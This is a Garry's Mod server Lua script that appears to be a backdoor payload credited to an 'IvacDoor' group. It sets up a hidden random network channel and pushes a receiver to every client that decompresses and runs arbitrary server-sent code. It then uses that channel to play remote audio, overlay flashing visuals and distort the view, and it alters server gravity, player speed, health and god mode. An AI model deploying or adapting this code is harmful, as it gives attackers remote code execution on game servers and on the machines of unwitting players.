local function rdm_str(len)
    if !len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

local net_string = rdm_str(25)
local secure_string_1 = rdm_str(math.random(5,25))
local secure_string_2 = rdm_str(math.random(5,25))

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;Circle_FFT_Load&quot;,false)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, secure_string_1,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;Circle_FFT_Load&quot;,false)()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

timer.Simple( 1, function()
SendToClient([[

local songURL = &quot;https://kvac.cz/assets/cradles.mp3&quot;

local AMP = 600

sound.PlayURL(songURL , 
	&quot;mono&quot; , function(sc , err , errname)

		if(IsValid(sc)) then
			
			station = sc
			station:Play()
			
		else
		
			return

		end

data = {}
smoothdata = {}

for i = 1, 64 do
	smoothdata[i] = 0
end

function draw.Circle( x, y, radius, seg )
	local cir = {}

	table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
	for i = 0, seg do
		local a = math.rad( ( i / seg ) * -360 )
		table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
	end

	local a = math.rad( 0 ) -- This is needed for non absolute segment counts
	table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )

	surface.DrawPoly( cir )
end

mats = Entity(0):GetMaterials()

red,green,blue = 150,50,0
color = Color(red,green,blue, 50)

hook.Add(&quot;HUDPaint&quot;,&quot;Circle_FFT&quot;, function()
	draw.RoundedBox(0, 0, 0, ScrW(),ScrH(),color)

	station:FFT(data, FFT_128)
	for i = 1, 64 do
		if(smoothdata[i] == nil) then return end
		smoothdata[i] = Lerp(3*FrameTime(),smoothdata[i],data[i])
		surface.SetDrawColor( HSVToColor((CurTime()-i/10) % 6 * 60, 1, 1 ) )
		draw.NoTexture()
		draw.Circle(ScrW()/256 * i + i * (ScrW()-ScrW()/4)/256 + ScrW()/16,ScrH()/2, smoothdata[i]*AMP, 30 )
		draw.Circle(ScrW()-ScrW()/256 * i - i * (ScrW()-ScrW()/4)/256 - ScrW()/16,ScrH()/2, smoothdata[i]*AMP, 30 )
	end

	if data[3] &gt; 0.08 then
		rgb = math.random(0,2)
		if rgb == 0 then
			if red &gt; 250 then red =0 end
			red = red+1
		elseif rgb == 1 then
			if green &gt; 250 then green =0 end
			green = green+1
		else
			if blue &gt; 250 then blue =0 end
			blue = blue+1
		end
		color = Color(red,green,blue, 50)
		for k,v in pairs(mats) do
			Material(v):SetVector(&quot;$color&quot;, Vector(0,0,a*23))
		end
	else
		for k,v in pairs(mats) do
			Material(v):SetVector(&quot;$color&quot;, Vector(a*23,0,0))
		end
		for _, v in ipairs(player.GetAll()) do
		    v:SetWeaponColor(Vector(red / 255, green / 255, blue / 255))
		end
	end

end) -- HOOK

function GAMEMODE:PostDraw2DSkyBox()
	if data[3] &gt; 0.08 then
	render.Clear(a*2300,0,0,100)
	else
	render.Clear(0,0,a*2300,100)
	end
end
function GAMEMODE:PreDrawSkyBox()
	if data[3] &gt; 0.08 then
	render.Clear(a*2300,0,0,100)
	else
	render.Clear(0,0,a*2300,100)
	end
end
end)

function MyCalcView(ply,pos,angles,fov)
a = 0
for i = 1,64 do
a = a + smoothdata[i]
end
a = a / 64
view = {}
view.origin = pos
view.angles = angles
view.fov = fov - a * 300
return view
end

hook.Add(&quot;CalcView&quot;,&quot;MyCalcView&quot;,MyCalcView)
]])
local GHack = {&quot;IvacDoor&quot;, &quot;Ivac&quot;, &quot;IvacDoor&quot;, &quot;Circle FFT&quot;}
local GHackdoorMembers = {&quot;Nsfw&quot;,&quot;Soufiw&quot;,&quot;_1c&quot;,&quot;IvacDoor&quot;,&quot;this beatifull SSV&quot;}
hook.Add(&quot;Think&quot;,&quot;PlayerIsSoFast&quot;,function()
for k, v in pairs(player.GetAll()) do
    v:SetRunSpeed(400 * 3)
    v:SetWalkSpeed(200 * 3)
	v:SetHealth(1337)
	v:GodEnable()
end
end)
end)

RunConsoleCommand(&quot;sv_gravity&quot;, &quot;100&quot;)
timer.Create(&quot;pubed_ez&quot;, 5, 300,function()
    for i=1, #player.GetHumans() do
        local ply = player.GetHumans()[i]
    end
end)

timer.Simple(500.5,function()
SendToClient([[
hook.Remove( &quot;HUDPaint&quot;, &quot;Circle_FFT&quot;)
hook.Remove( &quot;CalcView&quot;, &quot;MyCalcView&quot;)
LocalPlayer():ConCommand(&quot;stopsound&quot;)
function GAMEMODE:PostDraw2DSkyBox()
	render.Clear(0,0,150,100)
end
function GAMEMODE:PreDrawSkyBox()
	render.Clear(0,0,150,100)
end

local mats = Entity(0):GetMaterials()
for k,v in pairs(mats) do
Material(v):SetVector(&quot;$color&quot;, Vector(1,0,0))
end
]])
RunConsoleCommand(&quot;sv_gravity&quot;, &quot;600&quot;)
hook.Remove(&quot;Think&quot;,&quot;PlayerIsSoFast&quot;)
for k, v in pairs(player.GetAll()) do
    v:SetRunSpeed(400)
    v:SetWalkSpeed(200)
	v:SetHealth(100)
	v:GodDisable()
end
end)